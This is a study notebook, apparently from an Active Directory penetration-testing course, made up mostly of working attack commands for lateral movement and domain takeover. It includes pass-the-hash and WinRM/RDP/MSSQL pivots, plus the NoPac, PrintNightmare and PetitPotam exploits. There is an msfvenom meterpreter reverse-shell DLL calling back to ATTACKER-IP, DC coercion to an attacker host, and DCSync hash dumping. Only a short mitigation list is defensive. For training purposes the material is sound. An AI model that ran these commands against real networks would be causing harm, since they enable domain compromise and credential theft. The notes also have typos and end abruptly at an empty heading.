 # 1- Privileged Access
Once we gain a foothold in a domain, the next step is to move laterally or escalate privileges to reach domain compromise. 
1.  ==If we already have local admin rights==, **we can use Pass-the-Hash over SMB.** 

2. ==If not==, **we can still pivot using other remote access methods:**
     **Remote Desktop Protocol (RDP)** → GUI access if the user has Remote Desktop privileges
     **PowerShell Remoting  (WinRm)** → command execution if the user has Remote Management rights
     **MSSQL Server (SQLAdmin)** → sysadmin rights allow remote login and OS command execution through the SQL service account

These paths can be discovered via tools like BloodHound, PowerView, or built-in enumeration.
as the following edges exist to show us what types of remote[[9-Stacking The Deck]] access privileges a given user has:
- [CanRDP](https://bloodhound.specterops.io/resources/edges/can-rdp)
- [CanPSRemote](https://bloodhound.specterops.io/resources/edges/can-ps-remote)
- [SQLAdmin](https://bloodhound.specterops.io/resources/edges/sql-admin)
## scan services & login
**scan this services:**
```bash
nmap -p 3389,5985,5986,445,1433,53,88,135 <target-ip> -sV -Pn
```
**login to the domain computers** 
```bash
# windows
# --- Method 1: Run as domain user directly (on Windows domain-joined machine)
runas /user:<DOMAIN>\<USER> cmd          # Opens a new CMD as <USER>, will ask for <PASSWORD>
powershell                              # From inside CMD, launch PowerShell as <USER>

# --- Method 2: WinRM:  Run with PSCredential (inside PowerShell)
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force   # Store password securely
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $SecPassword)  
Enter-PSSession -ComputerName <TARGET> -Credential $Cred    # Remote session as <USER>

# --- Method 3: Runas with /netonly (if machine is not domain-joined)
runas /netonly /user:<DOMAIN>\<USER> powershell.exe   # Use <USER> creds only for network access
--------------------------------------------
# linux
# with crackmapexec
# domain
  crackmapexec <smb/winrm/rdp> <SUBNET/COMPUTERS-LISTS.txt> -u <USER> -p "<PASS>" -x whoami # auto detect the domain
# local   
  crackmapexec <smb/winrm/rdp> <SUBNET/COMPUTERS-LISTS.txt> -u <USER> -p "<PASS>" -x whoami--local-auth
  
# with NetExec
# domain
  nxc <smb/winrm/mssql/rdp/wmi> <SUBNET> -u <USER> -p 'P@ssw0rd' -x whoami -d <DOMAIN>
# lcoal 
nxc smb <SUBNET> -u UserNAme -p 'PASSWORDHERE' -x whoami --local-auth
nxc smb <SUBNET> -u '' -p '' --local-auth
nxc smb <SUBNET> -u UserNAme -H 'LM:NT' -x whoami --local-auth
nxc smb <SUBNET> -u UserNAme -H 'NTHASH' -x whoami --local-auth

# psexec (get shell)
psexec.py <DOMAIN.LOCAL>/<USER>@<DC01.DOMIAN.LOCAL> -target-ip <Computer-Target-IP>

# Evil-WinRM
evil-winrm -i <TARGET-IP> -u <USER> -p '<PASSWORD>'  # Remote shell as <USER>
```
## Check Local Admin Rights for Domain Users
**In BloodHound, click on Domain Users object >> Analysis Tab >> run “Find computers where group has local admin rights”  Queries  → view results.**

## SMB
**need administrator priv on the target machine**
```bash

# with TGT 
cat /etc/krb5.conf
# [libdefaults]
#         default_realm = INLANEFREIGHT.HTB

# [realms]
#     INLANEFREIGHT.HTB = {
#        kdc = dc01.inlanefreight.htb 

cat /etc/hosts

# psexec:
psexec.py <DOMAIN.LOCAL>/<USER>@<DC01.COMPUTER.LOCAL> -target-ip <TARGTE-COMPUTER-IP>

# with smbsec
smbexec.py <DOMAIN.LOCAL>/<USER>@<DC01.COMPUTER.LOCAL> -target-ip <TARGTE-COMPUTER-IP>

# with tgt ticket
impacket-smbexec -k -no-pass administrator@COMPUTER-DC.LOCAL -dc-ip <DC-IP> -target-ip <COMPUTER-DC-IP>
 
impacket-psexec -k -no-pass administrator@COMPUTER-DC.LOCAL -dc-ip <DC-IP> -target-ip <COMPUTER-DC-IP>

```
## Remote Desktop
1.  **if we control a local admin user -> we can access it via RDP**
2. - ==if we control a **Domain User** don't have the local admin Right== **but does have the rights to RDP into one or more machines.** 
         we could use the new host position to:
         1. Launch further attacks
        2. We may be able to escalate privileges and obtain credentials for a higher privileged user
         3. We may be able to pillage the host for sensitive data or credentials
#### Enumerating the Remote Desktop Users Group
**Using PowerView,** we could  enumerating members of the `Remote Desktop Users` group on a given host
```powershell
import-module .\PowerView.ps1
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
#=> MemberName   : <DOMIAN>\Domain Users  
```
[+] ==find **Domain Users  group** (`all` users in the domain) can RDP to the Host==
>  Such Hosts may contain sensitive data or privilege escalation opportunities, allowing us to gain local admin rights and steal higher-privileged credentials for further domain access.
#### Checking  Domain Users Group has RDP Rights  
Does the Domain Users group have local admin rights or execution rights (such as RDP or WinRM) over one or more hosts?
**In BloodHound, Click on Domain Users Group Object >> Node info >> Execution Right >> ==First Degree RDP Privileges==**
![[Pasted image 20250819210757.png]]
#### Check User have RDP Right
**In BloodHound, Click on the  User  Object >> Node info >> Execution Right >> ==First Degree RDP Privilege==s**
![[Pasted image 20250819212242.png]]

>CanRDP
#### pre-built queries
We could also check the `Analysis` tab and run the pre-built queries ==Find Workstations where Domain Users can RDP== or ==Find Servers where Domain Users can RDP==.
#### Connect 

```bash
xfreerdp /v:<TARGET_IP_OR_HOSTNAME> /u:<DOMAIN>\<USERNAME> /p:<PASSWORD>
xfreerdp /v:target_host /u:username /pth:NTLM_HASH
```
To test this access, we can either use a tool such as `xfreerdp` or `Remmina` from our VM or the Pwnbox or `mstsc.exe` if attacking from a Windows host.

## WinRM
Like RDP, _Windows Remote Management (WinRM_) access may be granted to a user or group, sometimes even low-privileged, which can be leveraged for data hunting, privilege escalation, or local admin access.
#### Enumerating the WinRm Group Members
```powershell
import-module PowerView.ps1
Get-NetLocalGroupMember -ComputerName <COMPUTER-NAME> -GroupName "Remote Management Users" 
  #=> MemberName   : <DOMAIN>\<USER>
```
#### Enum WinRm Users with BloodHound
```bash
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

![[Pasted image 20250821223031.png]]
> CanPSRemote
#### Connect to WinRM from Windows
```powershell
$password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("<DOMAIN>\<USER>", $password)
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred

hostname #=> <winrm-computer-2>
Exit-PSSession #=> exit 
```
#### Connect to WinRM from Linux
```bash
evil-winrm -i 10.129.201.234 -u forend
```

## SQL Server Admin
we will encounter SQL servers in the environments we face. It is common ==to find user and service accounts set up with sysadmin privileges on a given SQL server instance.==

We may obtain SQL Service credentials for an account via:
- 1.  Kerberoasting (common)
-  2.  LLMNR/NBT-NS Response Spoofing
-  3.  password spraying
- 4.  search for creds on share files (using Snaffler)  to find web.config or other config files

#### Enum MSSQL Server Admin Users 

We can check for `SQL Admin Rights` in the `Node Info` tab for a given user
![[Pasted image 20250821225046.png]]

or use this custom Cypher query to search: (better + fast)
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```
![[Pasted image 20250821225156.png]]
[+] ==find `<USER-2>`. (damundsen) + we already have a ALC right to change the password of that User using User-1== 
Let's assume we changed the account password to `<New-PASSWORD>` using our ACL rights. We can now authenticate and run operating system commands.

#### Enumerating MSSQL Instances with PowerUpSQL

```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
# DomainAccount  : Useer-2 ==> domain account do have sysadmin privileges under which the SQL Server service is running.
# Spn: MSSQLSvc/<SQL-Server-Name.LOCAL>:1433  
```

#### Connect to MSSQL From Windows
```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLQuery -Verbose -Instance "<SQL-SERVER-IP>,1433" -username "<DOMAIN>\<USER-2>" -password "NEW-PASS" -query 'Select @@version'
```
#### Connect to MSSQL From Linux
```bash
impacket-mssqlclient <DOMAIN>/<USER-2>@<SQL-SERVER-IP> -windows-auth
enable_xp_cmdshell
# xp_cmdshell <command>.
xp_cmdshell whoami /priv    # check the MSSQL Account priv on the server
  # SeAssignPrimaryTokenPrivilege 
  # SeImpersonatePrivilege   
```
[+] ==find `SeImpersonate and SeAssignPrimaryToken` so we can  escalate to `SYSTEM` level privileges (using tools such as [JuicyPotato](https://github.com/ohpe/juicy-potato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), or [RoguePotato](https://github.com/antonioCoco/RoguePotato))==


---

# 2-  Kerberos "Double Hop" Problem
**Description :**  

**Double hop** =  when you connect to one machine and then try to connect from it to another machine.

When you connect to one machine using **WinRm** (**it will use Kerberos**)  you can’t reuse that session(User creds or user tgt) to access another machine because y**our password/hash isn’t stored**, only a ticket for the first hop.

**Explanation **
- **Auth with SMB** → uses **NTLM**, password/hash is cached in memory → can access other resources with the same user.
Because NTLM stored your password/hash, the system could ask the KDC for **extra tickets** beyond just the first machine:
```powershell
klist
    # 0> Client: backupadm @ INLANEFREIGHT.LOCAL
    # Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL

    #1> Client: backupadm @ INLANEFREIGHT.LOCAL
    # Server: academy-ea-db01$ @ INLANEFREIGHT.LOCAL
```

- **Auth with WinRM** → uses **Kerberos**, only a ticket for the first machine is given so no password cached  for the current user → cannot access other resources with the same user (double hop fails) . **we can confirm there is no cached pass using mimikatz :**
```powershell
  .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit #=> no pass
```
**and there is only TGT ticket for only our machine**
```powershell
klist
    #1> Client: backupadm @ INLANEFREIGHT.LOCAL
    # Server: academy-ea-db01$ @ INLANEFREIGHT.LOCAL
```



**Example :**
![[Pasted image 20250822135517.png]]
- You log in to **DEV01** with Kerberos as `backupadm` using **WinRM**.
- From DEV01, you try to access `FILE01` (ex. enum SPN using PowerView).
- ❌ Fails → DEV01 has no creds to ask KDC for a new ticket.
- ✅ Works if you give new creds, or if using NTLM/Delegation.
## Workarounds
We'll cover **two  solution methods** in this section: the first being one that we can use **if we are working with an evil-winrm session** and the second **if we have GUI access to a Windows host** (either an attack host in the network or a domain-joined host we have compromised.)
#### Workaround #1: PSCredential Object
We  connect to the remote host via host A and set up a PSCredential object .**so When we ENum the AD using PowerView we  pass our credentials** 
```powershell
# we connect from our attack host to that machien using WinRm
klist # => no tgt 
import-module .\PowerView.ps1
get-domainuser -spn # eroor confirm Double Hop problem

#1: PSCredential Object
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $SecPassword)
get-domainuser -spn -credential $Cred 
```

#### Workaround #2: Register PSSession Configuration (windows)
if we're on a domain-joined host and can connect remotely to another using **WinRM** 
or if we are working from a Windows attack host and connect to our target **via WinRM using the Enter-PSSession cmdlet**

 we have another option to change our setup to be able to  reach the DC or other resources without PSCredential and  retyping creds 
```powershell
# we are in Windows attack host / or in domain computer
# we connect to another host using PSSession (WinRm)
Enter-PSSession -ComputerName <NEXT-TARGET> -Credential <DOMAIN>\<USER>

# confirm we don't cached the password and we don't have the tgt ticket
klist # => no tgt 
import-module .\PowerView.ps1
get-domainuser -spn # eroor confirm Double Hop problem

# solution:
egister-PSSessionConfiguration -Name <USER> -RunAsCredential <DOMAIN>\<USER>
Restart-Service WinRM
Enter-PSSession -ComputerName <NEXT-TARGET> -Credential <DOMAIN>\<USER> -ConfigurationName  <USER>
klist # => tgt 
import-module .\PowerView.ps1
get-domainuser -spn #=> WORK !!
```

>We can’t use `Register-PSSessionConfiguration` from Evil-WinRM (no GUI creds popup, needs elevation). It also fails from Linux PowerShell due to Kerberos limits. ✅ Works best from a Windows attack host or an RDP jump host with valid creds.

We can also use other methods such as CredSSP, port forwarding, or injecting into a process running in the context of a target user (sacrificial process) that we won't cover here.

# 3- Latest Vulnerabilities

Many companies are slow to install security patches. Because of this, attackers can use new vulnerabilities to gain access or escalate privileges. The techniques shown here are very recent (within the last 6–9 months).

These attacks are advanced and should be tested only in a lab environment. They are safer than older destructive ones like Zerologon or DCShadow, but they can still cause problems (e.g., PrintNightmare may crash the print service). Always use caution, take notes, and communicate with clients.

Since cybersecurity changes quickly, we must stay updated, practice new attacks, and keep learning new tools and methods.

## 1- NoPac (SamAccountName Spoofing)
NoPac, also called _Sam_The_Admin_ or _SamAccountName Spoofing_, was released at the end of 2021. It combines two CVEs:

- **CVE-2021-42278 → SAM account name spoofing**  
    Lets a normal user rename a computer account’s **SamAccountName** to look like a Domain Controller.
- **CVE-2021-42287 → Kerberos PAC bypass**  
    Makes Kerberos issue a TGT for the wrong account when names are similar.

By default, **authenticated users can create up to 10 computer accounts** in Active Directory. The attacker starts by creating or using a computer account they control. They then use **CVE-2021-42278 (SAM Name Spoofing)** to rename this computer account to match the **Domain Controller’s SAM account name** (for example, renaming their machine to `DC01$`).

Once renamed, the attacker requests a **Kerberos Ticket Granting Ticket (TGT)** for the **fake DC name**. Because the account name matches the real DC, **Kerberos issues a valid TGT for the Domain Controller account (DC$)**. At this point, the attacker possesses a ticket that allows them to impersonate the DC.

Next, the attacker **renames the computer account back** to its original name. The TGT remains valid because Kerberos trusts the ticket, not the current name. Using **CVE-2021-42287 (PAC Bypass)**, the attacker then requests another TGT, this time for the **Domain Administrator account**. Since the ticket is from a DC and DCs are fully trusted, **Kerberos grants a Domain Admin TGT**.

With this Domain Admin TGT, the attacker has **full control over the domain**, including **SYSTEM-level access** on any Domain Contr

#### Cloning the NoPac Exploit Repo
```bash
git clone https://github.com/Ridter/noPac.git #=> scanner.py , noPac.py
```
#### Scanning for NoPac
We  use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is, in fact, vulnerable..

```bash
sudo python3 scanner.py <DOMAIN.local>/<USER>:<PASSWORD> -dc-ip <DC-IP> -use-ldap
  #=> ms-DS-MachineAccountQuota = 10  # we can add 10 Computer
  #=> [*] Got DC01$ TGT 
  #=> [*] Got Domain Administrator TGT 
```
#### Running NoPac & Getting a Shell
semi-interactive shell session is established with the target using smbexec.py.
```powershell
sudo python3 noPac.py <DOMIAN.LOCAL>/<USER>:<PASSWORD> -dc-ip <DC-IP>  -dc-host <DC-HOST-NAME> -shell --impersonate administrator -use-ldap
  # C:\Windows\system32>  # [!] shell WITH smbexec.py
```
Keep in mind with smbexec shells we will need to use exact paths instead of navigating the directory structure using `cd`.
#### Confirming the Location of TGT Tickets
We could then use the ccache file to perform a **pass-the-ticket attack**
```bash
ls #=>  administrator_DC01.DOAMIN.local.ccache   
```
#### Using noPac to DCSync the Built-in Administrator Account
We can also use the tool with the `-dump` flag to perform a DCSync using secretsdump.py
```bash
sudo python3 noPac.py <DOMIAN.LOCAL>/<USER>:<PASSWORD> -dc-ip <DC-IP>  -dc-host <DC-HOST-NAME> -shell --impersonate administrator -use-ldap -dump -just-dc-user <DOMAIN>/administrator
#=> \administrator:<HASH> : doamin admin hash
```
## Windows Defender & SMBEXEC.py Considerations
`smbexec.py` runs commands by creating services (e.g., **BTOBTO/BTOBO**) and batch files (`execute.bat`). Each new command creates a temp script that runs, then deletes itself.
Defender/EDR often blocks this behavior (e.g., flagged as **VirTool:Win32/MSPSEexecCommand**).and Because it’s noisy and easily detected, **smbexec.py** is not good for stealth.

## 2- PrintNightmare
PrintNightmare is the nickname given to two vulnerabilities (CVE-2021-34527 and CVE-2021-1675) found in the Print Spooler service that **runs on all Windows operating systems**. that **allow for privilege escalation and remote code execution.** ==by  executing a shared file on the attack host==
**exploit PrintNightmare  allow us to gain a SYSTEM shell session on a Domain Controlle**
we will be using [cube0x0's](https://twitter.com/cube0x0?lang=en) exploit
#### Cloning the Exploit
```bash
git clone https://github.com/cube0x0/CVE-2021-1675.git
# Install cube0x0's Version of Impacket
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```
#### Enumerating for Print System Remote Protocol (MS-RPRN)
We can use `rpcdump.py` to see if `Print System Asynchronous Protocol` and `Print System Remote Protocol` are exposed on the target.
```bash
impacket-rpcmap @<DC-IP> | egrep 'MS-RPRN|MS-PAR'
  # Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
  # Protocol: [MS-RPRN]: Print System Remote Protocol 
```
#### Exploit PrintNightmare
```bash
# Generating a DLL Payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER-IP> LPORT=<PORT> -f dll > <nameofpayload.dll>

# Creating a Share with smbserver.py
sudo smbserver.py -smb2support <ShareName> /path/to/nameofpayload.dll

# Configuring & Starting MSF multi/handler
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <ATTACKER-IP>
set LPORT <PORT>
run

# Running the Exploit
sudo python3 CVE-2021-1675.py <DOMAIN.LOCAL>/<ANY-DOMAIN-USER>:<PASSWORD>@<DC-IP> '\\<ip-attack-host>\<ShareName>\<nameofpayload.dll>'

# MSF CONSOLE 
C:\Windows\system32>whoami
```
[+]  ==If all goes well after running the exploit, the target will access the share and execute the payload. The payload will then call back to our multi handler giving us an elevated SYSTEM shell.==

## 3- PetitPotam (MS-EFSRPC)
PetitPotam ([CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the [Local Security Authority Remote Protocol (LSARPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc) by abusing Microsoft’s [Encrypting File System Remote Protocol (MS-EFSRPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31). This technique allows an unauthenticated attacker to take over a Windows domain where [Active Directory Certificate Services (AD CS)](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs) is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate. This certificate can then be used with a tool such as `Rubeus` or `gettgtpkinit.py` from [PKINITtools](https://github.com/dirkjanm/PKINITtools) to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.

[This](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/) blog post goes into more detail on NTLM relaying to AD CS and the PetitPotam attack.

- **PKINIT** = Public Key Cryptography for Initial Authentication
- **AS-REP** = Authentication Server Reply

Cert → KDC sends AS-REP  
AS-REP key (your long-term key) encrypts the session key

TGT: holds identity + session key + lifetime, encrypted with KDC key  
TGS: holds identity + PAC + service session key, encrypted with service key

AS-REP key lets you later decrypt PAC (e.g. with getnthash.py)


> **PrinterBug** → MS-RPRN (Printer RPC) | need domain creds   (in password attack)
> `python3 printerbug.py DOMAIN/user:pass@<DC_IP> <ATTACKER_IP>`
> **PetitPotam** → MS-EFSRPC | no auth needed  
> `python3 PetitPotam.py <ATTACKER_IP> <DC_IP>`
> **Both** → force DC auth → attacker → relay NTLM → AD CS → cert → TGT → DCSync


### Enum  Certification Authority servers and Templates
**Enumerate Certification Authority servers (find where the CA lives) and Templates**  
Use certi to query AD and see which host runs AD CS.

```bash
python3 certi.py list 'DOMAIN/user:Password123!' -k -n --dc-ip <DC_IP> --class service
  #=> CA Host:  <CA-SERVER.LOCAL>
```

**Enumerate Templates**  
List available certificate templates and spot misconfigs.

```bash
python3 certi.py list 'DOMAIN/user:Password123!' -k -n --dc-ip <DC_IP> --vuln --enable
  #=> Template: DomainController
```

### Exploit From linux 

####  Relaying to Get DC Certificate + AS-REP Key
##### Starting ntlmrelayx.py
First off, we need to start `ntlmrelayx.py` in one window on our attack host, specifying the Web Enrollment URL for the CA host and using either the KerberosAuthentication or DomainController AD CS template. ==we already enum the CA sever + the Template==  
```bash
sudo ntlmrelayx.py -debug -smb2support --target http://<CA-SERVER.LOCAL>/certsrv/certfnsh.asp --adcs --template DomainController
```
##### Run PetitPotam.py
**the exploit will  attempt to Force  the Domain Controller to authenticate to our host where ntlmrelayx.py is running** 
- **Windows EXE**: Run the compiled PetitPotam version.
- **Mimikatz**: `misc::efs /server:<DC> /connect:<attack host>`
- **PowerShell**: `Invoke-PetitPotam.ps1`
- **Linux**: `python3 PetitPotam.py <attack host IP> <DC IP>`

Here we use linux attack host and we run the tool and attempt to coerce authentication via the [EfsRpcOpenFileRaw](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8) method.
```bash
python3 PetitPotam.py <attack host IP> <Domain Controller IP>
```
##### Catch Base64 Certificate + AS-REP Key of DC01$
Back in our other window, we will see a successful login request and obtain the base64 encoded certificate for the Domain Controller if the attack is successful.
```bash
# sudo ntlmrelayx.py -debug -smb2support --target http://<CA-SERVER.LOCAL>/certsrv/certfnsh.asp --adcs --template DomainController

  # [*] Base64 certificate of user <COMPUTER-DC01$> = <DC$-CERT-BASE64-OUTPUT>
  # AS-REP encryption key (you might need this later): = <AS-REP-encrypt-key>
```
[+] ==Base64 Certificate  Authority of user <COMPUTER-DC01$>==
[+] ==AS-REP encryption key==

#### Request DC01$ TGT  (Pass The Cert attack)
Next, we can take this base64 certificate and use `gettgtpkinit.py` to request a Ticket-Granting-Ticket (TGT) for the domain controller.
```bash
python3 PKINITtools/gettgtpkinit.py <DOMAIN.LOCAL>/<COMPUTER-DC01\$ -pfx-base64 <CERT-BASE64-OUTPUT> dc01.ccache
  #=> Saved TGT to dc01.ccache File
```
###### Setting the KRB5CCNAME Environment Variable
The TGT requested above was saved down to the `dc01.ccache` file, which we use to set the KRB5CCNAME environment variable, so our attack host uses this file for Kerberos authentication attempts.
```bash
export KRB5CCNAME=dc01.ccache
klist #=> Default principal: <COMPUTER-DC01$>
```

#### Using DC01$ TGT to DCSync (Pass the Ticket)
We can then use this TGT with `secretsdump.py` to perform a DCSync and retrieve one or all of the NTLM password hashes for the domain.
```bash
impacket-secretsdump -just-dc-user <DOMAIN>/administrator -k -no-pass "<COMPUTER-DC01$>"@<HOSTNAME-DC01.DOMAIN.LOCAL>
# or 
impacket-secretsdump -k -no-pass administrator@DOMIAN.LOCAL@COMPUTER-DC01.DOMAIN.LOCAL -dc-ip <DC-IP> -target-ip <DC-IP> -just-dc-user  DOMAIN/administrator
   # NTDS.DIT secrets : \administrator:500:<NTLM> 
   
# dump all SAM hashes + lsa + NTDS.DIT  
impacket-secretsdump -k administrator@DOMAIN.LOCAL@COMPUTER-DC01.DOMAIN.LOCAL -dc-ip <DC-IP> -target-ip <DC-IP>   
# or same 
impacket-secretsdump -k administrator@COMPUTER-DC01.DOMAIN.LOCAL -dc-ip <DC-IP> -target-ip <DC-IP>   
```
We could also use a more straightforward command: `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` because the tool will retrieve the username from the ccache file
##### Confirming Admin Access to the DC01$

Finally, we could use the NT hash for the built-in Administrator account to authenticate to the Domain Controller. From here, we have complete control over the domain and could look to establish persistence, search for sensitive data, look for other misconfigurations and vulnerabilities for our report, or begin enumerating trust relationships
```bash
crackmapexec smb <DC-IP> -u administrator -H <NTLM-HASH>
```

#### Alternate Route – Extract DC$ NT Hash via U2U (getnthash.py)
We can also take an alternate route once we have the TGT for our target. Using the tool `getnthash.py` from PKINITtools we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request with the [Privileged Attribute Certificate (PAC)](https://stealthbits.com/blog/what-is-the-kerberos-pac/) which contains the NT hash for the target. This can be decrypted with the AS-REP encryption key we obtained when requesting the TGT earlier.

==TGS(of the DC)==: ( identity info + ==PAC (NT hash...)==+ service session key ) ==encrypted with our AS-REP key==
```bash
python PKINITtools/getnthash.py -key <AS-REP-KEY>  <DOMAIN.LOCAL>/<COMPUTER-DC01\$
# Recovered NT Hash : <nt-hash>
```
##### Using DC01$ NTLM (NT) Hash to DCSync (Pass the Hash)
```bash
secretsdump.py -just-dc-user DOMAIN/administrator "COMPUTER-DC01$"@<DC-IP> -hashes <DC-NT-HASH>
# username : RID : LM-hash : NT-hash :::
```
### Exploit From Windows
Alternatively, once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once.
#### Requesting TGT and Performing PTT with DC01$ Machine Account
```powershell
.\Rubeus.exe asktgt /user:COmputer-DC01$ /certificate:<CERT-BASE64-OUTPUT> /ptt
# [*] base64(ticket.kirbi): <TGT-OUTPUT>
# [+] Ticket successfully imported!

klist #=> Client: ACADEMY-EA-DC01$
```
#### Performing DCSync with Mimikatz (Pass the Ticket)
```powershell
.\mimikatz.exe
lsadump::dcsync /user:inlanefreight\krbtgt
# Credentials:   Hash NTLM: 16e26ba33e455a8c338142af8d89ffbc
```
### PetitPotam Mitigations
- To prevent NTLM relay attacks, use [Extended Protection for Authentication](https://docs.microsoft.com/en-us/security-updates/securityadvisories/2009/973811) along with enabling [Require SSL](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429) to only allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services
- [Disabling NTLM authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain) for Domain Controllers
- Disabling NTLM on AD CS servers using [Group Policy](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-incoming-ntlm-traffic)
- Disabling NTLM for IIS on AD CS servers where the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services are in use

recommend the whitepaper [Certified Pre-Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) as this demonstrates attacks against AD CS that can be performed using authenticated API calls. This shows that just applying the CVE-2021-36942 patch alone to mitigate PetitPotam is not enough for most organizations running AD CS


---

# 3- Other Misconfigurations

## Exchange Related Group Membership
- **Microsoft Exchange** = email and calendar server that integrates deeply with Active Directory Because of this, Exchange often gets **high privileges** in the domain.

- **1- Exchange Windows Permissions**  group: 
    - Not a _protected_ group.
    - ==Members can **change the DACL** on the **domain object**.==
    - ==Since a DACL controls **who has access/deny**, this means members can give themselves **replication rights** → run **DCSync** → dump password hashes.==
    
- How attackers abuse this:
    - **DACL misconfiguration**: If the group’s DACL allows it, attackers can add themselves into Exchange Windows Permissions.
    -  **Compromised Account Operators account**:
        - Account Operators can add users into many groups (including Exchange Windows Permissions).
        - They can also reset many user passwords (often used by IT support staff).
        - Once added to Exchange Windows Permissions → attacker can change domain DACL → grant DCSync rights.
        - Real environments often place **support staff, power users, or even computers** in **Account Operators**.
        - If these accounts are compromised → it can lead to **full domain compromise** via DCSync.
![[Pasted image 20250830134921.png]]
`Account Operators → AddMember → Exchange Windows Permissions → WriteDACL → Domain Object → DCSync`

**2- Organization Management:** Exchange extremely powerful group , can access the mailboxes of all domain users.also has ==full control== of the OU called ==Microsoft Exchange Security== Groups, which contains the group ==Exchange Windows Permission==

![[Pasted image 20250830133611.png]]
`Organization Management → Full Control of Microsoft Exchange Security Groups OU → Manage Exchange Windows Permissions`

[+] ==If we can **compromise an Exchange server**, this will often **lead to Domain Admin privileges**. Additionally, dumping credentials in memory from an Exchange server will produce 10s if not 100s of **cleartext credentials or NTLM hashes.** This is often due to users logging in to Outlook Web Access (OWA) and Exchange caching their credentials in memory after a successful login.==

## PrivExchange Attack

PrivExchange is an attack against Microsoft Exchange Server. A normal domain user with a mailbox can trick the Exchange server into connecting out and trying to authenticate using **NTLM**. Because the server runs as **SYSTEM**, it uses its **Domain Computer Account**  to do this. An attacker can capture that NTLM authentication and **relay it to the Domain Controller’s LDAP service**. This makes the DC think the attacker is Exchange$.

the Exchange server account had special rights in Active Directory (==WriteDACL on the domain==). With those rights, the attacker can change permissions in AD and give their own account **DCSync rights**. DCSync rights allow an account to replicate passwords from the Domain Controller, which means the attacker can ==dump all hashes from Active Directory.== In the end, the attacker can fully compromise the domain and become Domain Admin.

## 3- Printer Bug

- Any domain user can force a Windows server to **authenticate to an attacker-controlled host** by calling `RpcOpenPrinter` and `RpcRemoteFindFirstPrinterChangeNotificationEx` over the spooler’s named pipe (`\\server\pipe\spoolss`).
- Because the Print Spooler runs as **SYSTEM**, it authenticates with its **machine account credentials**.
    
- This NTLM authentication can be **relayed to LDAP** to:
    - Give the attacker **DCSync rights** to dump all AD password hashes, or
    - Abuse **RBCD** to impersonate any user and move laterally, potentially compromising other forests if trusts allow TGT delegation.

We can use tools such as the `Get-SpoolStatus` module from [this](http://web.archive.org/web/20200919080216/https://github.com/cube0x0/Security-Assessment) tool (that can be found on the spawned target) or [this](https://github.com/NotMedic/NetNTLMtoSilverTicket) tool to check for machines vulnerable to the [MS-PRN Printer Bug](https://blog.sygnia.co/demystifying-the-print-nightmare-vulnerability). This flaw can be used to compromise a host in another forest that has Unconstrained Delegation enabled, such as a domain controller. It can help us to attack across forest trusts once we have compromised one forest.
#### Enumerating for MS-PRN Printer Bug
```powershell
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

# exploit from pasword attack module : pass the cert 
 python3 printerbug.py INLANEFREIGHT.LOCAL/<ANY_Domain_USER>:"PASS"@<DC01-ip> <ATTACKER-ip
```

## MS14-068

